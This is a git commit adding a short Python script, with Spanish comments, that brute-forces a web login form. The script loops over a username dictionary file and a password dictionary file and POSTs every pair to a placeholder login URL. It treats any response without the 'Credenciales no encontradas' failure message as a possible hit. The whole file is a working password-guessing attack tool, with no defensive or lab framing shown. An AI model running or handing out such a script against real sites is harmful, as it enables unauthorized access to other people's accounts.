2ddb674cc927f27519f505c8712d3e0ac0a4d7b1
FrhackDuSa <francisco.ds.developer@outlook.com>
2022-07-27 10:54:52 -0500

    create Script_Brute_GET.py
    primera version del script por metodo post

---
+++ Script_Brute_POST.py
@@ -0,0 +1,39 @@
+import requests
+import ssl
+from io import BytesIO
+
+#Direccion de pagina WEB
+url="https://dominio.com.mx/login"
+print ('Inicia proceso')
+#filepath aqui va la ruta del archivo que ocuparemos para diccionario de usuarios
+#filepath2 aqui va la ruta del archivo que ocuparemos para diccionario de contraseñas
+filepath = 'diccionario_usuario.txt'
+filepath2 = 'dic_pas.txt'
+with open(filepath) as fp:
+   line = fp.readline()
+   cnt = 1
+   while line:
+       print(line.strip())
+       usr=''+line.strip()
+       pas=''
+       with open(filepath2) as fp2:
+          line2 = fp2.readline()
+          cnt2 = 1
+          while line2:
+              pas=''+line2.strip()
+              data = {"j_username": usr, "j_password": pas, "locale":"es"}
+              print (url)
+              print (data)
+              get_body=''
+              get_body = requests.post(url, data).text
+			  #aqui puedes buscar una cadena especifica en la cadena que regresa 
+              if (get_body.find('Credenciales no encontradas') != -1 ):
+                   print ("---> MENSAJE DATOS INCORRECTOS")
+				   #print (get_body)
+              else:
+                   print ("-------------------------------------->>>OTRA RESPUESTA")
+                   #print (get_body)
+              line2 = fp2.readline()
+              cnt2 += 1
+       line = fp.readline()
+       cnt += 1
